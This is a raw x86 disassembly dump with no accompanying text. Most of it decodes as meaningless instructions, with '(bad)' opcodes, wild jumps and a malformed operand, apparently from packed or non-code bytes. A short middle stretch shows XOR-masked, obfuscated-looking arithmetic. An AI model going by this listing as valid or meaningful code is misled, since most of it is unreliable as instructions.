  407ebe:	jns    0x407e6b
  407ec0:	mov    bl,0xaa
  407ec2:	repz ror edi,0x63
  407ec6:	test   eax,0x65be9208
  407ecb:	mov    esi,0xbec4bdbe
  407ed0:	mov    esi,0xdce34980
  407ed5:	jmp    0xf33f3613
  407eda:	sub    al,0xfe
  407edc:	dec    ebp
  407edd:	clc    
  407ede:	adc    BYTE PTR [edx-0x60],dl
  407ee1:	test   DWORD PTR [ecx+0x332ee143],edi
  407ee7:	inc    esp
  407ee8:	xlat   BYTE PTR ds:[ebx]
  407ee9:	xlat   BYTE PTR ds:[ebx]
  407eea:	ret    0x1bb1
  407eed:	add    BYTE PTR [esi],bl
  407eef:	test   DWORD PTR [ebp*4+0x3c6ea3fd],esi
  407ef6:	inc    esi
  407ef7:	mov    bl,0x89
  407ef9:	sub    al,0x9c
  407efb:	push   eax
  407efc:	xor    al,BYTE PTR [ebx-0x2c7c9970]
  407f02:	aas    
  407f03:	aad    0x1b
  407f05:	xchg   esp,eax
  407f06:	xchg   esp,eax
  407f07:	sbb    al,BYTE PTR [ebx+0x73]
  407f0a:	mov    DWORD PTR [edi-0x72],esi
  407f0d:	shl    DWORD PTR [esi+0x17],0x8
  407f11:	lods   eax,DWORD PTR ds:[esi]
  407f12:	dec    eax
  407f13:	int3   
  407f14:	stos   BYTE PTR es:[edi],al
  407f15:	int3   
  407f16:	out    dx,eax
  407f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f18:	(bad)  
  407f1a:	pop    edx
  407f1b:	les    esi,FWORD PTR [ecx-0x23]
  407f1e:	mov    ebx,0x79cd0ad6
  407f23:	pop    ss
  407f24:	fld    DWORD PTR [ecx+0x6b]
  407f27:	mov    eax,0x452769a1
  407f2c:	cmp    edi,DWORD PTR [ebx+0x6149169e]
  407f32:	mov    edi,DWORD PTR [edx]
  407f34:	sub    dl,ah
  407f36:	lock outs dx,BYTE PTR ds:[esi]
  407f38:	pop    esp
  407f39:	add    DWORD PTR [eax-0x59],esp
  407f3c:	mov    ds:0x133394be,eax
  407f41:	scas   al,BYTE PTR es:[edi]
  407f42:	loopne 0x407f0d
  407f44:	jmp    0x407f2e
  407f46:	jle    0x407fbc
  407f48:	jmp    0x407f90
  407f4a:	inc    edx
  407f4b:	or     edi,edx
  407f4d:	call   0x90945be3
  407f52:	aaa    
  407f53:	repnz mov ecx,0xe2b8d6bb
  407f59:	(bad)
  407f5c:	clc    
  407f5d:	mov    ebp,0x9ad35d27
  407f62:	pop    edi
  407f63:	pop    ecx
  407f64:	(bad)  
  407f65:	shr    DWORD PTR [ecx+edi*8+0x6b4b5742],1
  407f6c:	add    DWORD PTR [eax],ebx
  407f6e:	fnstenv [ebx+0x404d3983]
  407f74:	xlat   BYTE PTR ds:[ebx]
  407f75:	in     eax,dx
  407f76:	cmp    ecx,esp
  407f78:	push   0xf
  407f7a:	ret    0x568a
  407f7d:	push   eax
  407f7e:	test   DWORD PTR [edx],esi
  407f80:	mov    ch,0xa5
  407f82:	lahf   
  407f83:	clc    
  407f84:	hlt    
  407f85:	cmc    
  407f86:	adc    esi,DWORD PTR [ecx+0xe2f0be2]
  407f8c:	mov    eax,0x1c29a76a
  407f91:	hlt    
  407f92:	aam    0xfc
  407f94:	mov    edx,0xaa6ff5df
  407f99:	jle    0x40800d
  407f9b:	cmp    esp,0xffffffa8
  407f9e:	sub    BYTE PTR [eax+0x4f188612],ch
  407fa4:	add    eax,0x95fa8636
  407fa9:	popf   
  407faa:	dec    edx
  407fab:	stos   DWORD PTR es:[edi],eax
  407fac:	or     ecx,DWORD PTR [edi]
  407fae:	cmp    DWORD PTR [edi-0x6d],ecx
  407fb1:	and    edx,DWORD PTR [ebp-0x62d2ab20]
  407fb7:	push   edx
  407fb8:	rol    BYTE PTR [esi+0x49163870],cl
  407fbe:	fidiv  WORD PTR [edx+0x69]
  407fc1:	test   eax,0xa8c646eb
  407fc6:	dec    ebx
  407fc7:	adc    al,0xd5
  407fc9:	jne    0x40800f
  407fcb:	mov    eax,0xd2c7f8d7
  407fd0:	dec    edi
  407fd1:	xchg   DWORD PTR [ecx],eax
  407fd3:	lods   eax,DWORD PTR ds:[esi]
  407fd4:	mov    ?,WORD PTR [eax+0x305a978]
  407fda:	and    eax,0xf10dc4be
  407fdf:	sahf   
  407fe0:	test   al,0x35
  407fe2:	mov    al,ds:0x96ee7604
  407fe7:	mov    eax,0xa9698e2e
  407fec:	xor    dl,BYTE PTR [ebx+0x2c]
  407fef:	int    0xae
  407ff1:	imul   esp,DWORD PTR [edi+0x1d922a7a],0xb7ee1508
  407ffb:	sub    dh,BYTE PTR [ebx+0x65537e42]
  408001:	mov    bl,0x3e
  408003:	xchg   esp,eax
  408004:	mov    ah,0xbc
  408006:	xchg   ebx,eax
  408007:	jmp    0xdc7a9e08
  40800c:	std    
  40800d:	or     ebx,DWORD PTR [edx]
  40800f:	dec    edx
  408010:	jg     0x408022
  408012:	gs inc esp
  408014:	dec    eax
  408015:	xor    ah,BYTE PTR [ecx-0x2486bdc5]
  40801b:	xchg   ecx,eax
  40801c:	popf   
  40801d:	je     0x407ff7
  40801f:	push   ebx
  408020:	rcl    BYTE PTR [esi+eiz*1-0x4319c2ae],cl
  408027:	mov    WORD PTR [eax],fs
  408029:	jo     0x407fb2
  40802b:	ja     0x408097
  40802d:	push   es
  40802e:	or     DWORD PTR [ebx],0x14
  408031:	sbb    bl,BYTE PTR [ebp-0x40]
  408034:	clc    
  408035:	lods   eax,DWORD PTR ds:[esi]
  408036:	(bad)  
  408038:	mov    al,ds:0xe78ed391
  40803d:	pop    esp
  40803e:	xchg   ebx,eax
  40803f:	mov    cl,0x2e
  408041:	lea    esp,[esi]
  408043:	xchg   edi,eax
  408044:	int3   
  408045:	in     eax,0x4f
  408047:	sub    bl,BYTE PTR [esp+edx*8-0x75b0f83b]
  40804e:	xor    edi,edx
  408050:	cli    
  408051:	ret    
  408052:	pop    ss
  408053:	jnp    0x4080b3
  408055:	lock push edi
  408057:	cs fwait
  408059:	retf   0xf94e
  40805c:	adc    DWORD PTR [ebp-0x61],esp
  40805f:	cmp    ebp,DWORD PTR [eax+0x245e6b20]
  408065:	repnz mov bh,0x94
  408068:	mov    al,ds:0xefc924fe
  40806d:	test   BYTE PTR [esi+0x3a],bl
  408070:	ins    DWORD PTR es:[edi],dx
  408071:	mov    ebx,edx
  408073:	lea    ecx,[esi+0x36d494d4]
  408079:	imul   ebp,DWORD PTR [ecx-0x17],0xfffffffb
  40807d:	out    0xa2,al
  40807f:	mov    ch,0x99
  408081:	mov    ebx,0xc3fb7c59
  408086:	xlat   BYTE PTR ds:[ebx]
  408087:	push   eax
  408088:	xor    cl,BYTE PTR [ebx]
  40808a:	scas   eax,DWORD PTR es:[edi]
  40808b:	outs   dx,DWORD PTR ds:[esi]
  40808c:	xor    DWORD PTR [eax+edx*2+0x3e35533],eax
  408093:	shl    dh,1
  408095:	adc    eax,0xb4163107
  40809a:	leave  
  40809b:	ja     0x4080b9
  40809d:	out    dx,eax
  40809e:	cdq    
  40809f:	mov    ds:0x96da981a,al
  4080a4:	retf   
  4080a5:	pop    es
  4080a6:	or     DWORD PTR [ebp-0x2a],eax
  4080a9:	push   ebx
  4080aa:	shr    BYTE PTR [ebx-0x47],1
  4080ad:	les    esi,FWORD PTR [edx]
  4080af:	lods   al,BYTE PTR ds:[esi]
  4080b0:	xchg   DWORD PTR [esp+ecx*1],esp
  4080b3:	(bad)  
  4080b4:	loopne 0x4080ee
  4080b6:	repnz inc edi
  4080b8:	pop    edi
  4080b9:	mov    ebx,0x3a3a221b
  4080be:	mov    ecx,cs
  4080c0:	or     al,0xb4
  4080c2:	add    al,0xa5
  4080c4:	jmp    0x4080ca
  4080c6:	iret   
  4080c7:	(bad)  
  4080c8:	gs dec esp
  4080ca:	pushf  
  4080cb:	fs adc dl,dl
  4080ce:	scas   eax,DWORD PTR es:[edi]
  4080cf:	dec    ebp
  4080d0:	dec    ebx
  4080d1:	(bad)  
  4080d2:	not    ebp
  4080d4:	dec    esp
  4080d5:	arpl   WORD PTR [esi+edi*2-0x71ec96ed],bx
  4080dc:	sub    BYTE PTR [eax+0x1210d763],bl
  4080e2:	fcomp  QWORD PTR [eax+0x71]
  4080e5:	jbe    0x4080d4
  4080e7:	dec    ecx
  4080e8:	(bad)  
  4080e9:	imul   esp,eax,0x7
  4080ec:	iret   
  4080ed:	dec    edx
  4080ee:	xor    eax,0xf9fe2348
  4080f3:	mov    esp,0xa93e5a27
  4080f8:	sbb    DWORD PTR [edx+ebp*2-0x54],ebp
  4080fc:	mov    al,0x22
  4080fe:	mov    edi,0xf14020b1
  408103:	rol    DWORD PTR [ebp-0x5cfb7cb7],0xf1
  40810a:	mov    ah,0xb2
  40810c:	cdq    
  40810d:	daa    
  40810e:	outs   dx,DWORD PTR ds:[esi]
  40810f:	xor    eax,0xfa684a41
  408114:	sub    BYTE PTR [edx+0x3c],0xe3
  408118:	daa    
  408119:	test   eax,0xf50b0422
  40811e:	xlat   BYTE PTR ds:[ebx]
  40811f:	ret    0xecaf
  408122:	popa   
  408123:	imul   edx,edx,0x59
  408126:	xor    ecx,esp
  408128:	hlt    
  408129:	neg    dl
  40812b:	repnz pop ebp
  40812d:	xlat   BYTE PTR ds:[ebx]
  40812e:	xlat   BYTE PTR ds:[ebx]
  40812f:	dec    ecx
  408130:	loop   0x408165
  408132:	(bad)  
  408133:	jecxz  0x408183
  408135:	in     eax,dx
  408136:	retf   
  408137:	pop    ds
  408138:	mov    ebx,0x65c18958
  40813d:	rol    BYTE PTR [edx+0x72],cl
  408140:	xchg   DWORD PTR [ebx+0x78f69c03],eax
  408146:	mov    al,0x7c
  408148:	xchg   edx,eax
  408149:	rol    bh,1
  40814b:	aad    0xf9
  40814d:	mov    al,0x47
  40814f:	ret    
  408150:	or     cl,BYTE PTR [esi-0x7c]
  408153:	shl    DWORD PTR [ecx+0x77],cl
  408156:	jp     0x4081c4
  408158:	leave  
  408159:	push   ebx
  40815a:	mov    dh,0xe3
  40815c:	pop    ecx
  40815d:	scas   al,BYTE PTR es:[edi]
  40815e:	push   esi
  40815f:	push   ebp
  408160:	mov    ds:0xa961cc65,eax
  408165:	xchg   edi,eax
  408166:	or     al,0x78
  408168:	pop    ss
  408169:	dec    ebx
  40816a:	out    0xa0,eax
  40816c:	iret   
  40816d:	inc    esi
  40816e:	test   BYTE PTR [edi-0x69],0x5
  408172:	xchg   BYTE PTR [edx+ebx*1],al
  408175:	int3   
  408176:	xor    ch,cl
  408178:	shl    BYTE PTR [edi+0x31],1
  40817b:	inc    edi
  40817c:	stos   DWORD PTR es:[edi],eax
  40817d:	fiadd  DWORD PTR [ebx+0x47]
  408180:	rcl    ebx,0x56
  408183:	dec    eax
  408184:	or     bh,al
  408186:	jo     0x4081db
  408188:	pop    es
  408189:	mov    bh,0xc9
  40818b:	cmc    
  40818c:	ss push ebp
  40818e:	out    dx,eax
  40818f:	sbb    ch,BYTE PTR [ebx-0x26]
  408192:	(bad)  
  408193:	xor    BYTE PTR [edx+0x21],al
  408196:	scas   al,BYTE PTR es:[edi]
  408197:	jbe    0x4081d3
  408199:	popa   
  40819a:	loopne 0x40820b
  40819c:	adc    eax,0xbc26556e
  4081a1:	cmp    al,cl
  4081a3:	int3   
  4081a4:	xor    edi,ebx
  4081a6:	cmp    eax,0x68cc2bdb
  4081ab:	outs   dx,DWORD PTR ds:[esi]
  4081ac:	enter  0xfccc,0x2b
  4081b0:	pusha  
  4081b1:	adc    al,0x97
  4081b3:	add    al,0x83
  4081b5:	out    dx,ax
  4081b7:	popf   
  4081b8:	jb     0x408219
  4081ba:	add    DWORD PTR [ebp+0x1b],edx
  4081bd:	push   edx
  4081be:	cli    
  4081bf:	in     al,0xe9
  4081c1:	inc    eax
  4081c2:	xchg   ecx,eax
  4081c3:	fcom   QWORD PTR ds:0xbf6d6c02
  4081c9:	mov    cl,0x26
  4081cb:	jmp    0x40819b
  4081cd:	inc    edx
  4081ce:	dec    edx
  4081cf:	xor    BYTE PTR [ecx-0xa],dl
  4081d2:	stc    
  4081d3:	sub    edi,DWORD PTR [ebx+0x25e814c4]
  4081d9:	pop    DWORD PTR [esi]
  4081db:	loope  0x408205
  4081dd:	iret   
  4081de:	sub    BYTE PTR [ecx+0x121802d5],dh
  4081e4:	(bad)  
  4081e5:	push   0xacc03dba
  4081ea:	xchg   bl,bl
  4081ec:	dec    eax
  4081ed:	cmp    eax,0xf8ba917a
  4081f2:	add    al,0x2e
  4081f4:	ror    DWORD PTR [edi-0x2],cl
  4081f7:	inc    edx
  4081f8:	mov    DWORD PTR [ecx+0x6f],esp
  4081fb:	cmp    al,0x96
  4081fd:	shl    DWORD PTR [edx],0x8d
  408200:	adc    al,0x18
  408203:	call   0x96c3:0xfcb1d4bf
  40820a:	add    al,0x2c
  40820c:	xor    DWORD PTR [ebx+0x75416e68],0x2c
  408213:	dec    ebx
  408214:	and    eax,0xfc4b80d
  408219:	std    
  40821a:	ror    DWORD PTR [ebx+ebp*8],1
  40821d:	js     0x4081d5
  40821f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408220:	mov    al,0x99
  408222:	xchg   ebx,eax
  408223:	int    0xbd
  408225:	jns    0x408257
  408227:	dec    edi
  408228:	xchg   BYTE PTR [esp+eax*4+0x1f1b0488],dl
  40822f:	xor    ebp,esi
  408231:	xchg   esi,eax
  408232:	imul   esi,DWORD PTR [ebx+0xd],0xffffff95
  408236:	xchg   ebx,eax
  408237:	jno    0x408237
  408239:	leave  
  40823a:	push   edi
  40823b:	and    cl,ah
  40823d:	push   ss
  40823e:	adc    BYTE PTR [ecx+0x2dd8ac9],bh
  408244:	pop    edi
  408245:	loop   0x40822c
  408247:	pop    esi
  408248:	jbe    0x408245
  40824a:	repnz xchg esp,eax
  40824c:	jmp    0x7e03:0x3e848a61
  408253:	adc    BYTE PTR [edi-0x3df42dcd],bl
  408259:	add    eax,DWORD PTR ds:0x4226d8
  40825f:	shl    ecx,0x1e
  408262:	mov    DWORD PTR [ebp+0x14],eax
  408265:	mov    eax,DWORD PTR [ebp-0x48]
  408268:	mov    ecx,DWORD PTR [ebp-0x44]
  40826b:	shrd   eax,ecx,0x2
  40826f:	shr    ecx,0x2
  408272:	mov    ecx,DWORD PTR [ebp-0x48]
  408275:	mov    edx,DWORD PTR [ebp-0x44]
  408278:	xor    eax,edi
  40827a:	shl    ecx,0x1e
  40827d:	xor    edx,edx
  40827f:	or     eax,edx
  408281:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  408285:	mov    eax,DWORD PTR [ebp+0x14]
  408288:	add    BYTE PTR [eax],cl
  40828a:	mov    eax,DWORD PTR [ebp-0x38]
  40828d:	mov    ecx,DWORD PTR [ebp-0x34]
  408290:	shrd   eax,ecx,0x2
  408294:	xor    eax,edi
  408296:	shr    ecx,0x2
  408299:	mov    ecx,DWORD PTR [ebp-0x38]
  40829c:	mov    edx,DWORD PTR [ebp-0x34]
  40829f:	shl    ecx,0x1e
  4082a2:	mov    ecx,DWORD PTR [ebp-0x38]
  4082a5:	xor    edx,edx
  4082a7:	or     eax,edx
  4082a9:	mov    edx,DWORD PTR [ebp-0x34]
  4082ac:	add    eax,DWORD PTR ds:0x4226d8
  4082b2:	shrd   ecx,edx,0x2
  4082b6:	xor    ecx,edi
  4082b8:	shr    edx,0x2
  4082bb:	mov    edx,DWORD PTR [ebp-0x38]
  4082be:	mov    edi,DWORD PTR [ebp-0x34]
  4082c1:	xor    edi,edi
  4082c3:	or     ecx,edi
  4082c5:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  4082c9:	or     BYTE PTR [eax],cl
  4082cb:	mov    eax,DWORD PTR [esi]
  4082cd:	mov    ecx,DWORD PTR [esi+0x4]
  4082d0:	shl    eax,0x1e
  4082d3:	shl    edx,0x1e
  4082d6:	mov    edx,DWORD PTR [esi]
  4082d8:	mov    edi,DWORD PTR [esi+0x4]
  4082db:	xor    edi,0x9c2b8ae8
  4082e1:	xor    eax,0x80000000
  4082e6:	mov    DWORD PTR [ebp+0x14],eax
  4082e9:	mov    eax,0xcb79b577
  4082ee:	xor    edx,eax
  4082f0:	shrd   edx,edi,0x2
  4082f4:	shr    edi,0x2
  4082f7:	or     edi,DWORD PTR [ebp+0x14]
  4082fa:	xor    ecx,ecx
  4082fc:	or     edx,ecx
  4082fe:	mov    ecx,DWORD PTR [ebx]
  408300:	mov    DWORD PTR [ebp-0x64],edi
  408303:	mov    edi,DWORD PTR [ebx+0x4]
  408306:	mov    edi,ecx
  408308:	xor    ecx,ecx
  40830a:	shl    edi,0x1e
  40830d:	xor    edi,0x80000000
  408313:	mov    DWORD PTR [ebp+0x10],ecx
  408316:	mov    ecx,DWORD PTR [ebx]
  408318:	mov    DWORD PTR [ebp+0x14],edi
  40831b:	mov    edi,DWORD PTR [ebx+0x4]
  40831e:	xor    ecx,eax
  408320:	xor    edi,0x9c2b8ae8
  408326:	shrd   ecx,edi,0x2
  40832a:	or     ecx,DWORD PTR [ebp+0x10]
  40832d:	shr    edi,0x2
  408330:	mov    DWORD PTR [ebp-0x70],ecx
  408333:	mov    ecx,edi
  408335:	or     ecx,DWORD PTR [ebp+0x14]
  408338:	mov    DWORD PTR [ebp+0xc],edi
  40833b:	cmp    edx,DWORD PTR [ebp-0x70]
  40833e:	jne    0x408bb3
  408344:	cmp    DWORD PTR [ebp-0x64],ecx
  408347:	jne    0x408bb3
  40834d:	jmp    0x4083eb
  408352:	mov    eax,DWORD PTR [esi]
  408354:	mov    edx,DWORD PTR [esi+0x4]
  408357:	mov    eax,DWORD PTR [esi]
  408359:	mov    edx,DWORD PTR [esi+0x4]
  40835c:	mov    edx,eax
  40835e:	xor    eax,eax
  408360:	shl    edx,0x1e
  408363:	mov    DWORD PTR [ebp+0x10],eax
  408366:	mov    eax,DWORD PTR [esi]
  408368:	xor    edx,0x80000000
  40836e:	mov    DWORD PTR [ebp+0x14],edx
  408371:	mov    edx,DWORD PTR [esi+0x4]
  408374:	xor    eax,0xcb79b577
  408379:	xor    ecx,edx
  40837b:	shrd   eax,ecx,0x2
  40837f:	or     eax,DWORD PTR [ebp+0x10]
  408382:	shr    ecx,0x2
  408385:	mov    DWORD PTR [ebp+0x8],eax
  408388:	mov    eax,ecx
  40838a:	or     eax,DWORD PTR [ebp+0x14]
  40838d:	mov    ecx,DWORD PTR [ebx]
  40838f:	mov    edx,DWORD PTR [ebx+0x4]
  408392:	push   eax
  408393:	push   DWORD PTR [ebp+0x8]
  408396:	push   edx
  408397:	push   ecx
  408398:	call   0x41594e
  40839d:	mov    eax,DWORD PTR [esi]
  40839f:	mov    ecx,DWORD PTR [esi+0x4]
  4083a2:	shrd   eax,ecx,0x2
  4083a6:	shr    ecx,0x2
  4083a9:	shr    edx,0x1e
  4083ac:	xor    ecx,0xe70ae2ba
  4083b2:	push   ecx
  4083b3:	xor    eax,edi
  4083b5:	mov    DWORD PTR [ebp+0x10],edx
  4083b8:	mov    edx,DWORD PTR [ebx]
  4083ba:	mov    edi,DWORD PTR [ebx+0x4]
  4083bd:	push   eax
  4083be:	push   edi
  4083bf:	push   edx
  4083c0:	call   0x41594e
  4083c5:	shld   edx,eax,0x2
  4083c9:	shl    eax,0x2
  4083cc:	mov    ecx,eax
  4083ce:	or     ecx,DWORD PTR [ebp+0x10]
  4083d1:	xor    eax,eax
  4083d3:	or     edx,eax
  4083d5:	xor    ecx,0xcb79b576
  4083db:	xor    edx,0x9c2b8ae8
  4083e1:	mov    DWORD PTR [esi],ecx
  4083e3:	mov    DWORD PTR [esi+0x4],edx
  4083e6:	mov    eax,0xcb79b577
  4083eb:	mov    ecx,DWORD PTR [esi]
  4083ed:	mov    edx,DWORD PTR [esi+0x4]
  4083f0:	mov    edx,ecx
  4083f2:	shl    edx,0x1e
  4083f5:	xor    edx,0x80000000
  4083fb:	mov    DWORD PTR [ebp+0x14],edx
  4083fe:	mov    edx,DWORD PTR [esi]
  408400:	mov    edi,DWORD PTR [esi+0x4]
  408403:	xor    edi,0x9c2b8ae8
  408409:	xor    edx,eax
  40840b:	shrd   edx,edi,0x2
  40840f:	shr    edi,0x2
  408412:	or     edi,DWORD PTR [ebp+0x14]
  408415:	xor    ecx,ecx
  408417:	or     edx,ecx
  408419:	mov    ecx,DWORD PTR [ebx]
  40841b:	mov    DWORD PTR [ebp+0xc],edi
  40841e:	mov    edi,DWORD PTR [ebx+0x4]
  408421:	mov    edi,ecx
  408423:	xor    ecx,ecx
  408425:	shl    edi,0x1e
  408428:	mov    DWORD PTR [ebp+0x10],ecx
  40842b:	mov    ecx,DWORD PTR [ebx]
  40842d:	xor    edi,0x80000000
  408433:	mov    DWORD PTR [ebp+0x14],edi
  408436:	mov    edi,DWORD PTR [ebx+0x4]
  408439:	xor    eax,ecx
  40843b:	jmp    0x4087dc
  408440:	xor    eax,0x7b36559b
  408445:	cmp    al,0xb6
  408447:	pushf  
  408448:	pop    eax
  408449:	out    dx,eax
  40844a:	push   0xffffffd1
  40844c:	imul   eax,DWORD PTR ds:0x6bbda486,0xc4bdbebe
  408456:	mov    esi,0xe9daa8be
  40845b:	xchg   ecx,eax
  40845c:	sbb    eax,0x7f4836ef
  408461:	je     0x408406
  408463:	rol    dl,cl
  408465:	inc    esi
  408466:	pop    esp
  408467:	pop    edi
  408468:	out    0x22,al
  40846a:	inc    ebx
  40846b:	xlat   BYTE PTR ds:[ebx]
  40846c:	scas   eax,DWORD PTR es:[edi]
  40846d:	(bad)  
  40846f:	outs   dx,DWORD PTR ds:[esi]
  408470:	dec    edi
  408471:	das    
  408472:	enter  0xad00,0x26
  408476:	xchg   edx,eax
  408477:	jae    0x4084a1
  408479:	cli    
  40847a:	call   0xe188:0xaa856df7
  408481:	pushf  
  408482:	xchg   ecx,eax
  408483:	mov    al,ds:0xce06d3e7
  408488:	xchg   DWORD PTR [esi+0x1],edx
  40848b:	sbb    cl,BYTE PTR [eax-0x6a]
  40848e:	jg     0x40843e
  408490:	or     ebp,eax
  408492:	xchg   esp,eax
  408493:	jge    0x4084db
  408495:	mov    ebp,ebx
  408497:	dec    esi
  408498:	pop    es
  408499:	adc    dl,BYTE PTR [edi-0x2f47c8eb]
  40849f:	loopne 0x4084d5
  4084a1:	sbb    edx,esp
  4084a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084a4:	push   ss
  4084a5:	test   al,0xb3
  4084a7:	and    ah,BYTE PTR [eax-0x6e]
  4084aa:	adc    bh,BYTE PTR [ecx-0x5d]
  4084ad:	and    ah,al
  4084af:	push   edx
  4084b0:	push   0x67
  4084b2:	aad    0xb7
  4084b4:	inc    esi
  4084b5:	xchg   ebx,eax
  4084b6:	test   BYTE PTR ss:[ecx],bl
  4084b9:	out    dx,al
  4084ba:	ins    BYTE PTR es:[edi],dx
  4084bb:	(bad)
  4084bf:	int3   
  4084c0:	mov    dl,0x2e
  4084c2:	dec    ecx
  4084c3:	pop    eax
  4084c4:	xchg   esi,eax
  4084c5:	dec    ebx
  4084c6:	push   esp
  4084c7:	pop    edx
  4084c8:	dec    ebx
  4084c9:	and    BYTE PTR [edx-0x8165d5b],0xde
  4084d0:	fwait
  4084d1:	or     eax,DWORD PTR [esi+0x23]
  4084d4:	mov    ch,0x3d
  4084d6:	jb     0x4084ec
  4084d8:	add    eax,0x522a6bb2
  4084dd:	dec    edx
  4084de:	js     0x40847b
  4084e0:	adc    DWORD PTR [eax-0x6d],eax
  4084e3:	xor    edx,DWORD PTR [ebp-0x67]
  4084e6:	pop    ecx
  4084e7:	xor    BYTE PTR [edx],0x8a
  4084ea:	xchg   DWORD PTR [esi-0x7e],esp
  4084ed:	into   
  4084ee:	cmp    bh,BYTE PTR [ebp-0x53]
  4084f1:	ins    DWORD PTR es:[edi],dx
  4084f2:	sbb    ecx,DWORD PTR ds:0x95c777b5
  4084f8:	fcmovne st,st(1)
  4084fa:	add    bl,BYTE PTR [ebp+0x4cb339b7]
  408500:	lock push ebp
  408502:	pop    ss
  408503:	repnz scas eax,DWORD PTR es:[edi]
  408505:	and    al,bh
  408507:	jae    0x4084dc
  408509:	mov    ch,0x24
  40850b:	sbb    edi,DWORD PTR [ebx-0x1d]
  40850e:	outs   dx,BYTE PTR ds:[esi]
  40850f:	int    0x54
  408511:	inc    ecx
  408512:	xchg   ecx,eax
  408513:	cdq    
  408514:	inc    edi
  408515:	cli    
  408516:	dec    esp
  408517:	and    ecx,DWORD PTR [ebp-0x14c1a80c]
  40851d:	mov    al,ds:0x9267fcfa
  408522:	inc    esp
  408523:	sub    BYTE PTR [ebx+0x36],0x97
  408527:	fsub   QWORD PTR [edx]
  408529:	ret    0xd32c
  40852c:	call   0x24f01770
  408531:	mov    dh,0x34
  408533:	sub    ch,cl
  408535:	mov    edx,DWORD PTR [edx-0x2439f262]
  40853b:	nop
  40853c:	sti    
  40853d:	add    cl,ch
  40853f:	xchg   esi,eax
  408540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408541:	(bad)  
  408543:	inc    ebp
  408544:	mov    dh,0xec
  408546:	js     0x408525
  408548:	lods   al,BYTE PTR ds:[esi]
  408549:	cmp    eax,DWORD PTR ss:[ebp+ebp*1-0x5b]
  40854e:	ss inc edi
  408550:	cmp    BYTE PTR [ebp+0x47],cl
  408553:	push   es
  408554:	out    dx,al
  408555:	sar    BYTE PTR [edi+eiz*2+0x2f],1
  408559:	int    0x6b
  40855b:	mov    ecx,0x5e65c5c4
  408560:	cmp    DWORD PTR [edx-0x2d],ecx
  408563:	mov    al,0xe1
  408565:	inc    esi
  408566:	mov    esp,0x6340d55a
  40856b:	sub    eax,0x7e853f38
  408570:	pop    ss
  408571:	je     0x4085ed
  408573:	xchg   ecx,eax
  408574:	outs   dx,BYTE PTR ds:[esi]
  408575:	xor    bh,dh
  408577:	jne    0x408596
  408579:	fcmovnb st,st(2)
  40857b:	ins    BYTE PTR es:[edi],dx
  40857c:	jmp    0xb22be685
  408581:	sub    DWORD PTR [esi+ebx*1],esi
  408584:	popa   
  408585:	xor    eax,0x8c94373
  40858a:	or     al,0x97
  40858c:	pop    ecx
  40858d:	cmp    dh,ch
  40858f:	mov    ch,0xb9
  408591:	bts    DWORD PTR [esi-0x47],ebx
  408595:	mov    cl,0xc2
  408597:	fst    QWORD PTR [ebx-0xf]
  40859a:	(bad)  
  40859b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40859c:	scas   eax,DWORD PTR es:[edi]
  40859d:	dec    esp
  40859e:	jno    0x408549
  4085a0:	stos   DWORD PTR es:[edi],eax
  4085a1:	(bad)  
  4085a2:	mov    al,0x76
  4085a4:	mov    al,ds:0x8fe86a51
  4085a9:	shr    BYTE PTR ds:0x33a24483,1
  4085af:	cmp    ebp,DWORD PTR [ecx]
  4085b1:	xchg   ebx,eax
  4085b2:	pop    edx
  4085b3:	xchg   DWORD PTR [esi-0x71a9a4cf],ebp
  4085b9:	inc    eax
  4085ba:	push   es
  4085bb:	retf   
  4085bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085bd:	addr16 jb 0x4085ee
  4085c0:	(bad)  
  4085c1:	aad    0x47
  4085c3:	sar    DWORD PTR [ecx+ebp*8-0x2fcc498e],0x41
  4085cb:	je     0x4085d8
  4085cd:	push   ebx
  4085ce:	mov    ebx,0x1e2da2c8
  4085d3:	pop    ds
  4085d4:	jo     0x40856f
  4085d6:	std    
  4085d7:	dec    esp
  4085d8:	xor    bl,cl
  4085da:	pop    edx
  4085db:	mov    bh,0x7f
  4085dd:	add    BYTE PTR ds:0x6ed0d3a6,0x5f
  4085e4:	out    dx,al
  4085e5:	inc    edx
  4085e6:	push   ebp
  4085e7:	ins    BYTE PTR es:[edi],dx
  4085e8:	lods   eax,DWORD PTR ds:[esi]
  4085e9:	(bad)  
  4085ea:	mov    BYTE PTR [edi+0x27],ah
  4085ed:	xlat   BYTE PTR ds:[ebx]
  4085ee:	ins    DWORD PTR es:[edi],dx
  4085ef:	dec    edi
  4085f0:	mov    WORD PTR [edi+0x542dda9b],?
  4085f6:	int    0xb9
  4085f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085f9:	push   ebp
  4085fa:	(bad)  [ecx]
  4085fc:	scas   al,BYTE PTR es:[edi]
  4085fd:	cli    
  4085fe:	retf   0x553e
  408601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408602:	outs   dx,DWORD PTR ds:[esi]
  408603:	shld   DWORD PTR ds:0x6c23122a,ebx,cl
  40860a:	in     al,0x17
  40860c:	loope  0x408631
  40860e:	cmp    al,cl
  408610:	lods   eax,DWORD PTR ds:[esi]
  408611:	mov    dl,bh
  408613:	stc    
  408614:	inc    esp
  408615:	xchg   ebx,eax
  408616:	xor    DWORD PTR [ecx+edx*8],edx
  408619:	xchg   edi,eax
  40861a:	retf   
  40861b:	adc    eax,0xb18d2d68
  408620:	xchg   ecx,eax
  408621:	aas    
  408622:	xor    edx,DWORD PTR ds:0xf1f8d15e
  408628:	(bad)  
  40862a:	(bad)  
  40862b:	lea    edi,[eax+0x50]
  40862e:	mov    ebp,0x7104c2ab
  408633:	icebp  
  408634:	scas   al,BYTE PTR es:[edi]
  408635:	or     DWORD PTR [ebx-0x1f5a6fdf],ebp
  40863b:	jmp    FWORD PTR [bx+si]
  40863e:	push   0x611df282
  408643:	dec    esp
  408644:	inc    esp
  408645:	sbb    bl,bh
  408647:	push   eax
  408648:	xchg   edx,eax
  408649:	aam    0x2d
  40864b:	inc    esp
  40864c:	xlat   BYTE PTR ds:[ebx]
  40864d:	push   eax
  40864e:	adc    BYTE PTR [ebp+0x6bb70a41],cl
